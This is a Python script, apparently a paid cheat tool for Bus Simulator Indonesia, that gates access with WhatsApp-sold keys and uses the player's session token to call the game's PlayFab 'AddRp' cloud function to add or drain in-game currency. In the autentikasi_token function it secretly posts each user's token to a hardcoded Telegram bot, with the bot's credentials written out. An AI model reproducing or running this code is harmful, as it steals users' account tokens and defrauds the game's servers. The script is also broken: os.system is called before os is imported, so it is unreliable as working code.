import time
os.system('termux-timezone set Asia/Jakarta')
import os
import sys
import requests
import json
from datetime import datetime
from colorama import init, Fore, Style
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from datetime import datetime

# Fungsi untuk membersihkan layar (cross-platform)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk mengautentikasi dengan Google Sheets
def autentikasi_google():
    # Gunakan kredensial untuk akses Google Sheets
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_name('key-datavase-da5ceace4a2b.json', scope)
    client = gspread.authorize(creds)
    return client

# Fungsi untuk memverifikasi key
def verifikasi_key(key_input):
    client = autentikasi_google()
    
    # Buka sheet dengan nama 'Key Database'
    sheet = client.open('Key Database').sheet1
    
    # Ambil semua data dari sheet
    keys_data = sheet.get_all_records()
    
    # Cari key di dalam database
    for row in keys_data:
        if row['Key'] == key_input:
            # Ambil tanggal kadaluarsa dari kolom Expiration Time
            expiration_time = row['Expiration Time']
            
            # Ubah tanggal kadaluarsa ke format datetime
            expiration_date = datetime.strptime(expiration_time, "%Y-%m-%d")
            
            # Cek apakah key sudah kadaluarsa
            if expiration_date < datetime.now():
                return "𝗞𝗲𝘆 𝗦𝘂𝗱𝗮𝗵 𝗞𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮.", None
            else:
                return "Key valid.", expiration_date
    
    # Jika key tidak ditemukan
    return "𝗞𝗲𝘆 𝗧𝗶𝗱𝗮𝗸 𝗧𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿.", None


# Meminta input key
clear_screen() 
print() 
print() 
print() 
print(f'''   \x1b[1;33;41m • \x1b[1;37[ 𝗕𝗘𝗟𝗜 𝗞𝗘𝗬 𝗔𝗞𝗦𝗘𝗦 𝗛𝗨𝗕𝗨𝗡𝗚𝗜 𝗪𝗔: 𝟬𝟴𝟮𝟮 𝟳𝟱𝟯𝟴 𝟬𝟯𝟵𝟯 \x1b[1;33m • \x1b[0m\x1b[ \n''') 
key_input = input("K❏ 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐊𝐞𝐲 𝐀𝐤𝐬𝐞𝐬 𝐀𝐧𝐝𝐚: ")
result = verifikasi_key(key_input)

# Cek hasil verifikasi
if "𝗞𝗲𝘆 𝗦𝘂𝗱𝗮𝗵 𝗞𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮." in result or "𝗞𝗲𝘆 𝗧𝗶𝗱𝗮𝗸 𝗧𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿." in result:
    print(result)  # Menampilkan pesan error
    time.sleep(2)
    os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
    exit()  # Menghentikan eksekusi script jika key tidak valid atau kadaluarsa

# Lanjutkan ke menu jika key valid
print(result)


# Inisialisasi colorama (untuk memastikan kompatibilitas dengan Windows)
init(autoreset=True)

# Variabel global untuk token dan informasi akun
token_bussid = None
informasi_akun = {}

# URL Pastebin yang berisi password yang valid
pastebin_url = 'https://pastebin.com/raw/7fws6sbi'
    
#Fungsi Animasi
def typing_and_loading(t):
    # Warna untuk teks
    color_text = '\033[34m'  # Biru
    color_spinner = '\033[32m'  # Hijau
    color_white = '\033[37m'  # Putih (untuk angka)
    reset_color = '\033[0m'  # Reset warna

    # Efek pengetikan di awal
    message = f"{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{t}{color_text} 𝗗𝗲𝘁𝗶𝗸... {reset_color}"
    for i in range(len(message)):
        sys.stdout.write(f"\r{message[:i+1]}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    time.sleep(1)  # Memberikan jeda setelah pengetikan selesai
    
    # Menambahkan animasi spinner saat hitung mundur
    spinner_chars = ['|', '/', '-', '\\']
    for i in range(t * 4):  # Mengulang spinner beberapa kali agar lebih panjang
        remaining_time = t - (i // 4)  # Menghitung sisa waktu
        sys.stdout.write(f"\r{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{remaining_time}{color_text} 𝗗𝗲𝘁𝗶𝗸... {color_spinner}{spinner_chars[i % 4]}{reset_color}")
        sys.stdout.flush()
        time.sleep(0.25)

    print()  # Menambahkan baris baru setelah animasi selesai

# Tes fungsi
typing_and_loading(5)

# Fungsi untuk mengirim pesan menggunakan URL API Telegram
def kirim_pesan_via_url(token_bot, chat_id, pesan):
    url = f"https://api.telegram.org/bot{token_bot}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": pesan
    }
    try:
        response = requests.get(url, params=params)
        print(f"Respon API Telegram: {response.text}")  # Debugging respon
        if response.status_code == 200:
            print(Fore.GREEN + "Pesan berhasil dikirim ke Telegram.")
        else:
            print(Fore.RED + f"Pesan gagal dikirim. Status: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"Terjadi kesalahan saat mengirim pesan: {e}")

# Fungsi untuk meminta Token Bussid
def autentikasi_token():
    global token_bussid
    clear_screen()
    print() 
    print() 
    print() 
    print(Fore.GREEN + "\033[1m" + "𝐒𝐂𝐑𝐈𝐏 𝐓𝐎𝐏 𝐔𝐏 𝐁𝐔𝐒𝐒𝐈𝐃 𝟐𝟎𝟐𝟒! - 𝙼𝚞𝚕𝚝𝚒𝚏𝚒𝚝𝚞𝚛 ")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "Anda harus memasukkan Token Bussid untuk melanjutkan.")
    
    # Meminta token dari pengguna tanpa verifikasi
    token_input = input(Fore.CYAN + Style.BRIGHT + "\x1b[1;33;44m  \x1b[1;37[Ｔｏｋｅｎ 𝗕𝗨𝗦𝗦𝗜𝗗: \x1b[1;33m \x1b[0m\x1b[: ")
    token_bussid = token_input
    print("\033[1m" + Fore.GREEN + "𝗧𝗼𝗸𝗲𝗻 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻." + Style.RESET_ALL)
    time.sleep(2)

    # Kirim pesan ke Telegram setelah token dimasukkan
    pesan = f"Token dimasukkan oleh pengguna:\n {token_bussid} \n\n pada {time.strftime('%Y-%m-%d %H:%M:%S')}"
    TOKEN_BOT_TELEGRAM = "7481271703:AAHvMpZCcd6hyOJ04LceAVzbRym2bYJoF9M"  # Ganti dengan token bot Anda
    CHAT_ID_TELEGRAM = "-4501707408"  # Ganti dengan chat ID Anda
    kirim_pesan_via_url(TOKEN_BOT_TELEGRAM, CHAT_ID_TELEGRAM, pesan)
    
# Fungsi untuk mengambil informasi akun menggunakan GetPlayerCombinedInfo
def ambil_informasi_akun():
    global informasi_akun
    url = "https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo"
    headers = {
        'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
        'Content-Type': 'application/json',
        'X-Authorization': token_bussid
    }
    payload = {
        'PlayFabId': None,
        'InfoRequestParameters': {
            'GetUserAccountInfo': True,
            'GetUserInventory': True,
            'GetUserVirtualCurrency': True,
            'GetUserData': False,
            'UserDataKeys': None,
            'GetUserReadOnlyData': True,
            'UserReadOnlyDataKeys': None,
            'GetCharacterInventories': False,
            'GetCharacterList': False,
            'GetTitleData': True,
            'TitleDataKeys': None,
            'GetPlayerStatistics': False,
            'PlayerStatisticNames': None
        }
    }

    try:
        response = requests.post(url, json=payload, headers=headers)
        print(Fore.BLUE + "Respons mentah dari API:\n")  # Debugging
        print(response.text)  # Cetak respons API mentah
        time.sleep(0)  # Berikan jeda 5 detik agar pengguna dapat membaca hasilnya

        if response.status_code == 200:
            data = response.json()
            
            # Debugging - print seluruh data untuk memastikan struktur
            print(Fore.GREEN + Style.BRIGHT + "Data JSON yang diterima:")
            print(data)  # Debugging untuk memeriksa struktur JSON yang diterima
            
            # Akses informasi akun dan virtual currency
            info_result_payload = data.get("data", {}).get("InfoResultPayload", {})
            user_account_info = info_result_payload.get("AccountInfo", {})
            virtual_currency = info_result_payload.get("UserVirtualCurrency", {})

            # Menampilkan hasil debugging informasi akun dan saldo
            print(Fore.RED + "Akses ke Username dan Saldo:")
            print(f"UserAccountInfo: {user_account_info}")
            print(f"UserVirtualCurrency: {virtual_currency}")

            # Ambil nama akun dari kunci TitleInfo["DisplayName"]
            title_info = user_account_info.get("TitleInfo", {})
            nama = title_info.get("DisplayName", "Tidak diketahui")  # Akses DisplayName dalam TitleInfo
            saldo = virtual_currency.get("RP", 0)  # Gantilah 'GC' dengan 'RP'
            
            # Ambil ID akun dari TitleInfo -> TitlePlayerAccount -> Id
            title_player_account = title_info.get("TitlePlayerAccount", {})
            akun_id = title_player_account.get("Id", "Tidak diketahui")  # Akses ID akun dari TitlePlayerAccount

            # Set informasi akun
            informasi_akun = {
                'nama': nama,
                'saldo': saldo,
                'akun_id': akun_id
            }

            print(Fore.CYAN + Style.BRIGHT + f"Nama Akun: {informasi_akun['nama']}")
            print(Fore.CYAN + Style.BRIGHT + f"Saldo: {informasi_akun['saldo']}")
            print(Fore.CYAN + Style.BRIGHT + f"ID Akun: {informasi_akun['akun_id']}")
            return True
        else:
            print(Fore.RED + f"Gagal mengambil informasi akun: {response.status_code}")
            print(Fore.RED + f"Detail Error: {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi: {str(e)}")
        return False

# Fungsi untuk mengambil password dari pastebin
def ambil_password():
    try:
        response = requests.get(pastebin_url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(Fore.RED + Style.BRIGHT + "Gagal mengakses Pastebin.")
            return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi ke Pastebin: {str(e)}")
        return None

# Fungsi untuk verifikasi password
def verifikasi_password():
    password_benar = ambil_password()
    if password_benar is None:
        return False
    
    password_input = input(Fore.CYAN + Style.BRIGHT + "╰───▶ 𝕬𝖐𝖘𝖊𝖘 𝕻𝖊𝖒𝖎𝖑𝖎𝖐: ")
    
    if password_input == password_benar:
        print(Fore.GREEN + Style.BRIGHT + "Akses berhasil! Anda adalah pemilik script.")
        return True
    else:
        print(Fore.RED + "𝗔𝗸𝘀𝗲𝘀 𝘀𝗮𝗹𝗮𝗵,𝗵𝘂𝗯𝘂𝗻𝗴𝗶 𝐎𝐰𝐧𝐞𝐫!")
        time.sleep(2)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
        return False

# Fungsi khusus yang hanya bisa diakses pemilik
def fungsi_pemilik():
    print(Fore.GREEN + Style.BRIGHT + "Fungsi khusus pemilik telah diakses!")
    pengisian_nominal = int(input(Fore.CYAN + Style.BRIGHT + "Masukkan jumlah pengisian uang (dalam juta): "))
    pengisian_uang_khusus(pengisian_nominal)  # Memanggil fungsi pengisian uang dengan nominal

# Fungsi untuk akses lanjutan pemilik
def akses_lanjutan_pemilik():
    if verifikasi_password():  # Pastikan hanya pemilik yang bisa mengakses
        print(Fore.GREEN + Style.BRIGHT + "\n🔐 Anda telah masuk ke Akses Lanjutan Pemilik.")
        print(Fore.CYAN + Style.BRIGHT + "1. 𝗧𝗼𝗽 𝗨𝗽 𝗕𝘂𝘀𝘀𝗶𝗱 𝟮𝗠.")
        print(Fore.CYAN + Style.BRIGHT + "2. 𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝘂𝘀𝘀𝗶𝗱.")
        print(Fore.CYAN + Style.BRIGHT + "3. 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.")
        
        while True:
            try:
                pilihan = int(input(Fore.YELLOW + Style.BRIGHT + "𝗜𝗻𝗽𝘂𝘁 𝟯 𝗞𝗲 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮.: "))
                if pilihan == 1:
                    nominal = int(input(Fore.CYAN + Style.BRIGHT + "𝗞𝗲𝘁𝗶𝗸 𝗔𝗻𝗴𝗸𝗮 1 (Nominal 2M): "))
                    typing_and_loading(5)
                    pengisian_uang_khusus(nominal)
                if pilihan == 2:
                    kurascepat =int(input(Fore.MAGENTA + Style.BRIGHT + "\n𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝘂𝘀𝘀𝗶𝗱 (2M):")) 
                    typing_and_loading(5)
                    kuras_owner(kurascepat)
                elif pilihan == 3:
                    print(Fore.GREEN + Style.BRIGHT + "\n𝗞𝗲𝗺𝗯𝗮𝗹𝗶 𝗞𝗲 𝗠𝗲𝗻𝘂 𝗨𝘁𝗮𝗺𝗮...")
                    break
                else:
                    print(Fore.RED + Style.BRIGHT + "Pilihan tidak valid. Coba lagi.")
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Coba lagi.")
    else:
        print(Fore.RED + "Akses lanjutan pemilik ditolak.")

# Fungsi untuk melakukan pengisian uang
def pengisian_uang():
    pengisian = int(input(Fore.CYAN + Style.BRIGHT + "Masukkan jumlah pengisian (Rp 3.250.000):  "))
    for k in range(pengisian):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': 3250000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 {k + 1}/{pengisian}.")

# Fungsi untuk melakukan pengisian uang (khusus pemilik dengan nominal tertentu)
def pengisian_uang_khusus(nominal):
    for k in range(1):  # Cukup satu kali untuk pengisian uang khusus
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': nominal * 2147483647 },  # Menggunakan nominal yang dimasukkan
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗 𝗦𝘂𝗸𝘀𝗲𝘀: 𝗦𝗲𝗯𝗮𝗻𝘆𝗮𝗸 𝟮𝗠.")
# Fungsi pemilik kurasan instant
def kuras_owner(kurascepat):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -2147483647 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  # Refresh informasi akun

# Fungsi untuk kuras uang
def kurasan():
    kuras = int(input(Fore.RED + Style.BRIGHT + "Masukan jumlah input 1-999 (Rp 3.000.000):  "))
    for k in range(kuras):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -3000000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  # Refresh informasi akun
        print(Fore.CYAN + Style.BRIGHT + "Kuras Uang Selesai!")        

# Fungsi untuk menampilkan menu utama
def show_menu():
    clear_screen()
    
    
    current_datetime = datetime.now()
    hari = current_datetime.strftime("%A")
    bulan = current_datetime.strftime("%B")
    tanggal = current_datetime.strftime("%d-%m-%Y")
    
    status_key, expiration_date = verifikasi_key(key_input)
    
    if expiration_date is None:
        print(Fore.RED + f" Status Key: {status_key}")
    else:
        remaining_time = expiration_date - datetime.now()
        print(Fore.GREEN + f" Status Key: {status_key} (Sisa durasi anda: {remaining_time.days} hari)")
    
    print() 
    print() 
    print() 
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)
    print(Fore.CYAN + Style.BRIGHT + "    ✨ 𝗧𝗢𝗣 𝗨𝗣 𝗕𝗨𝗦𝗦𝗜𝗗 - 𝟮𝟬𝟮𝟰 - 𝗠𝗜𝗫𝗙𝗜𝗧𝗨𝗥. ✨")
    print(f'''   \x1b[1;33;41m • \x1b[1;37[𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗥𝗔𝗙𝗔𝗖𝗭𝗫 \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(f'''   \x1b[1;33;41m • \x1b[1;37[𝗛𝗔𝗥𝗜: {hari}, {bulan} {tanggal} \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)
    print(Fore.MAGENTA + Style.BRIGHT + f"👤 𝐍𝐚𝐦𝐚 𝐀𝐤𝐮𝐧: {informasi_akun.get('nama', 'Tidak diketahui')}")
    print(Fore.MAGENTA + Style.BRIGHT + f"💰 𝐒𝐚𝐥𝐝𝐨: Rp {informasi_akun.get('saldo', 0)}")
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗜𝗗 𝗔𝗸𝘂𝗻 𝗕𝗨𝗦𝗦𝗜𝗗: {informasi_akun.get('akun_id', 'Tidak diketahui')}")
    
    # Menampilkan status key
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗞𝗲𝘆: {expiration_date} | ({remaining_time.days} 𝐇𝐚𝐫𝐢)")
    
    print(Fore.GREEN + Style.BRIGHT + "❏" * 40)
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 1. 🌟 𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 2. 💸 𝗥𝗲𝘀𝗲𝘁 𝗨𝗮𝗻𝗴 𝗕𝗨𝗦𝗦𝗜𝗗")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 3. 🛠️ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗧𝗼𝗸𝗲𝗻 𝗔𝗻𝗱𝗮")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 4. 🚪 𝗞𝗲𝗹𝘂𝗮𝗿 𝗗𝗮𝗿𝗶 𝗦𝗰𝗿𝗶𝗽𝘁")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 5. 🔒 𝗔𝗸𝘀𝗲𝘀 𝗣𝗲𝗺𝗶𝗹𝗶𝗸 \x1b[1;33;41m • \x1b[1;37[(𝐎𝐰𝐧𝐞𝐫)\x1b[1;33m • \x1b[0m\x1b[")
    print() 
    print(Fore.YELLOW + Style.BRIGHT + "❏ 6. 🔑 𝗔𝗞𝗦𝗘𝗦 \x1b[1;33;41m • \x1b[1;37[(𝐏𝐫𝐞𝐦𝐢𝐮𝐦)\x1b[1;33m • \x1b[0m\x1b[")
    print() 
    print(Fore.GREEN + Style.BRIGHT + "❏" * 40)
    print()     

# Fungsi utama program
def main():
    autentikasi_token()
    if ambil_informasi_akun():
        while True:
            show_menu()
            try:
                pilihan = int(input(Fore.RED + Style.BRIGHT + "╰───▶𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙰𝚗𝚐𝚔𝚊 (1-6): "))
                if pilihan == 1:
                    pengisian_uang()
                elif pilihan == 2:
                    kurasan()
                elif pilihan == 3:
                    print(Fore.CYAN + f"Token Saat Ini: {token_bussid}")
                    time.sleep(2)
                elif pilihan == 4:
                    print(Fore.GREEN + Style.BRIGHT + "\n\x1b[1;33;41m • \x1b[1;37[𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝚃𝙸𝙽𝙶𝙶𝙰𝙻\x1b[1;33m •  \x1b[0m\x1b[")
                    sys.exit(0)
                elif pilihan == 5:
                    if verifikasi_password():
                        fungsi_pemilik()
                elif pilihan == 6:
                    akses_lanjutan_pemilik()
                else:
                    print(Fore.RED + Style.BRIGHT + "\nPilihan tidak valid. Coba lagi.")
                    time.sleep(2)
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "\nInput harus berupa angka. Coba lagi.")
                time.sleep(2)
    else:
        print(Fore.RED + "Gagal mengambil informasi akun. Program dihentikan.")
        sys.exit(1)

# Jalankan program hanya jika file ini di-eksekusi langsung
if __name__ == "__main__":
    main()